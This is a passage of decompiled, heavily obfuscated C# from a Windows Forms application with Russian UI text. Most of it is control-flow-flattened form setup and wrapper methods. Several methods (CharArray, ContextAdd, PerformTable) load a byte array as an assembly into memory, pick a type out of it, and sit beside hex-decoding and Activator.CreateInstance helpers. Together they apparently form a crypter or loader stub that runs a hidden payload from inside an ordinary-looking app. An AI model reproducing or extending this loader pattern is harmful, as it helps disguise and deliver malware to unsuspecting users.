					num = ((int)num2 * -1327532) ^ -968112862;
					continue;
				case 26u:
					num = ((int)num2 * -591525666) ^ -151328729;
					continue;
				case 25u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = ((int)num2 * -1942823082) ^ 0x6AAA285F;
					continue;
				case 24u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)((num2 * 1867289108) ^ 0x58C9EF21);
					continue;
				case 23u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)((num2 * 1085950376) ^ 0x69992CE6);
					continue;
				case 22u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = ((int)num2 * -328751786) ^ 0x7BF816CD;
					continue;
				case 21u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -25287419;
						num4 = -25287419;
					}
					else
					{
						num3 = -575629141;
						num4 = -575629141;
					}
					num = num3 ^ ((int)num2 * -1907938538);
					continue;
				}
				case 20u:
					num = (int)(num2 * 1064300908) ^ -920136176;
					continue;
				case 19u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -1582216510) ^ -108181756;
					continue;
				case 18u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -926297014) ^ -1866779631;
					continue;
				case 17u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)(num2 * 1932982605) ^ -488522146;
					continue;
				case 16u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = (int)((num2 * 316954158) ^ 0x48184FD5);
					continue;
				case 15u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)((num2 * 596939848) ^ 0x620A4354);
					continue;
				case 14u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)((num2 * 1544338049) ^ 0x30DE72F);
					continue;
				case 13u:
					num = (int)((num2 * 290897298) ^ 0x56BB7A6B);
					continue;
				case 12u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)(num2 * 1153935591) ^ -1598061948;
					continue;
				case 11u:
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = (int)((num2 * 1782025988) ^ 0x1068F407);
					continue;
				case 10u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = ((int)num2 * -1647942537) ^ 0x7F14711B;
					continue;
				case 9u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -1073310886) ^ -1198812547;
					continue;
				case 8u:
					num = (int)((num2 * 400245220) ^ 0x5EAA6E3E);
					continue;
				case 7u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = (int)(num2 * 347811450) ^ -442066446;
					continue;
				case 6u:
					num = ((int)num2 * -1123031544) ^ -730443739;
					continue;
				case 5u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = (int)(num2 * 1545125315) ^ -1056193677;
					continue;
				case 4u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = (int)((num2 * 948413915) ^ 0x53B28BC2);
					continue;
				case 3u:
					num = (int)((num2 * 1661302721) ^ 0x3E51E660);
					continue;
				case 2u:
					num = (int)((num2 * 1210065084) ^ 0x52A3A09F);
					continue;
				case 1u:
					button1 = Form1.smethod_53();
					num = ((int)num2 * -1879599962) ^ 0x2EABF143;
					continue;
				case 0u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -1208652704) ^ 0x23E230FE;
					continue;
				default:
					return;
				case 130u:
					break;
				case 100u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = default(Assembly);
		while (true)
		{
			int num = -429858685;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8D48E5A1u) % 5u)
				{
				case 4u:
					PerformTable(q);
					num = (int)((num2 * 686733531) ^ 0x7814C94E);
					continue;
				case 3u:
					num = ((int)num2 * -412273036) ^ 0x3BB3BFD2;
					continue;
				case 1u:
					q = ContextAdd(Level);
					num = (int)((num2 * 2044129671) ^ 0x118A08E8);
					continue;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = Form1.smethod_94(Form1.smethod_93(), Position);
		while (true)
		{
			int num = -1948569167;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xEEF1DB89u) % 3u)
				{
				case 1u:
					goto IL_000e;
				case 2u:
					break;
				default:
					return result;
				}
				break;
				IL_000e:
				num = ((int)num2 * -1387917516) ^ 0xADD4378;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
